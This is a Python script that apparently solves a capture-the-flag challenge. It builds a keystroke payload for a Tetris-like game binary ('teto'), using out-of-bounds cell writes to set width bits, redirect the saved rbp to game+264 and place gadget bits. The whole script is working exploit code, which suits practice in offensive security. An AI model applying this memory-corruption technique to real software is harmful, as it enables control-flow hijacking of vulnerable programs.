#!/usr/bin/env python3
"""Build the full key plan for the teto exploit."""
from __future__ import annotations
import sys
from teto2 import (Game, KINDNAME, rand_seq, choose, keys_place, keys_write, spawn_x)

# I pieces used for OR-writes, in sequence order
WRITE_PIECES = [77, 79, 80, 83, 86, 93, 94, 99, 101, 103]
# width bits 6,8,9 (10->74->330->842), rbp bit (stage88 b3), gadget bits
RBP_BIT = 3           # [game+96] low byte: OR this bit so rbp -> game+264
WRITE_X = [6, 8, 9, 720 + RBP_BIT, 789, 793, 796, 798, 802, 803]
PRESSURE_PIECE = 52   # I piece used to latch ceiling_pressure (harmless write)
STACK_N = 16          # pieces before it played without clearing, to reach 60 cells
LAST = WRITE_PIECES[-1]


def build(verbose=False, rbp_bit=None):
    if rbp_bit is not None:
        WRITE_X[3] = 720 + rbp_bit
    seq = rand_seq(LAST + 2)
    for i in WRITE_PIECES:
        assert seq[i] == 0, f"piece {i} is {KINDNAME[seq[i]]}, not I"
    g = Game()
    keys = []
    wi = 0
    for i, kind in enumerate(seq[: LAST + 1]):
        if i in WRITE_PIECES:
            x = WRITE_X[wi]; wi += 1
            assert g.pressure, "ceiling_pressure not set"
            px = x - 1
            assert px + 3 < g.width, f"write x={x} needs width>{px+3}, have {g.width}"
            keys.append(keys_write(x))
            g.pressure = 1
            g.set_cell(x, -1)
            if verbose:
                print(f"  p{i:3d} I  WRITE x={x:4d} -> width={g.width} writes={g.writes}")
            continue
        if i == PRESSURE_PIECE:
            keys.append("aaa" + "w")      # I -> MOVE_LOCK writes width bit1 (already set)
            g.pressure = 1
            g.set_cell(1, -1)
            if verbose:
                print(f"  p{i:3d} I  PRESSURE occ={g.occupied()} width={g.width}")
            continue
        if i < PRESSURE_PIECE - STACK_N:
            mode, allow = "flat", True
        elif i < PRESSURE_PIECE:
            mode, allow = "flat", False
        elif i < WRITE_PIECES[0]:
            mode, allow = "clear", True
        else:
            mode, allow = "keep", False
        r = choose(g, kind, allow, mode)
        if r is None:
            raise RuntimeError(f"no placement for piece {i} ({KINDNAME[kind]}) occ={g.occupied()}")
        rot, px, py = r
        keys.append(keys_place(kind, rot, px))
        g.lock(kind, rot, px, py)
        n = g.clear_lines()
        if verbose and (i >= WRITE_PIECES[0] - 3 or i % 20 == 0):
            print(f"  p{i:3d} {KINDNAME[kind]} rot{rot} x={px} y={py} occ={g.occupied()} h={max(g.heights())}")
    # topout: next piece, shove right then two 's'
    keys.append("d" * 12 + "ss")
    g.piece_keys = keys
    return "".join(keys), g, seq


if __name__ == "__main__":
    payload, g, seq = build(verbose="-v" in sys.argv)
    print("payload bytes", len(payload))
    print("final width", g.width, "writes", g.writes)
    print("occupied", g.occupied(), "max h", max(g.heights()))
    for row in g.g:
        print("".join("#" if c else "." for c in row))
